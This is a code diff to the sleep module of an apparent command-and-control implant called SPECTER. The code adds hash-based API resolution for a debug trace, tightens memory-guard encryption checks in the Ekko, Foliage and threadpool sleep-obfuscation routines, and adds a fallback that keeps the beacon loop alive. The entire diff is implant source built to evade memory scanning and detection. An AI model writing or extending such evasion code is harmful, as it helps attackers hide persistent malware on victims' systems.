@@ -24,6 +24,21 @@ static SLEEP_CONTEXT g_sleep_ctx;
    extern g_ctx references that generate .refptr entries */
 static IMPLANT_CONTEXT *s_sleep_impl_ctx = NULL;
 
+#ifdef SPECTER_DEV_BUILD
+/* OutputDebugStringA — same DJB2 as comms.h */
+#define HASH_OUTPUTDEBUGSTRINGA 0xF9EA2815
+static void sleep_dev_trace(const char *msg) {
+    typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
+    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
+    if (!k32) return;
+    fn_Dbg dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
+    if (dbg) dbg(msg);
+}
+#define SLEEP_TRACE(msg) sleep_dev_trace(msg)
+#else
+#define SLEEP_TRACE(msg) ((void)0)
+#endif
+
 #ifdef TEST_BUILD
 static DWORD g_test_random_seed = 0;
 static BOOL  g_test_seed_set = FALSE;
@@ -400,7 +415,8 @@ NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
@@ -422,7 +438,8 @@ NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
@@ -682,7 +699,8 @@ NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
@@ -709,7 +727,8 @@ NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
@@ -958,7 +977,8 @@ NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 #ifdef TEST_BUILD
     /* In test builds, use memguard encrypt/decrypt cycle if available */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     if (ectx && ectx->memguard.initialized) {
@@ -986,7 +1006,8 @@ NTSTATUS sleep_threadpool(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
 
     /* ---- Memory guard pre-sleep encryption ---- */
     EVASION_CONTEXT *ectx = NULL;
-    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
+    if (s_sleep_impl_ctx && s_sleep_impl_ctx->sleep_ctx == sctx &&
+        s_sleep_impl_ctx->evasion_ctx)
         ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;
 
     BOOL memguard_active = FALSE;
@@ -1196,19 +1217,33 @@ NTSTATUS sleep_cycle(IMPLANT_CONTEXT *ctx) {
     if (sleep_ms == 0)
         return STATUS_SUCCESS;
 
+    NTSTATUS status;
     switch (sctx->sleep_method) {
     case SLEEP_EKKO:
-        return sleep_ekko(sctx, sleep_ms);
+        status = sleep_ekko(sctx, sleep_ms);
+        break;
     case SLEEP_WFS:
-        return sleep_wfs(sctx, sleep_ms);
+        status = sleep_wfs(sctx, sleep_ms);
+        break;
     case SLEEP_FOLIAGE:
-        return sleep_foliage(sctx, sleep_ms);
+        status = sleep_foliage(sctx, sleep_ms);
+        break;
     case SLEEP_THREADPOOL:
-        return sleep_threadpool(sctx, sleep_ms);
+        status = sleep_threadpool(sctx, sleep_ms);
+        break;
     case SLEEP_DELAY:
     default:
+        status = sleep_delay(sctx, sleep_ms);
+        break;
+    }
+
+    /* OPSEC-safe fallback: if an advanced method fails, fall back to
+     * NtDelayExecution path instead of aborting the beacon loop. */
+    if (!NT_SUCCESS(status) && sctx->sleep_method != SLEEP_DELAY) {
+        SLEEP_TRACE("[SPECTER] sleep: advanced method failed, fallback to sleep_delay");
         return sleep_delay(sctx, sleep_ms);
     }
+    return status;
 }
 
 /* ------------------------------------------------------------------ */
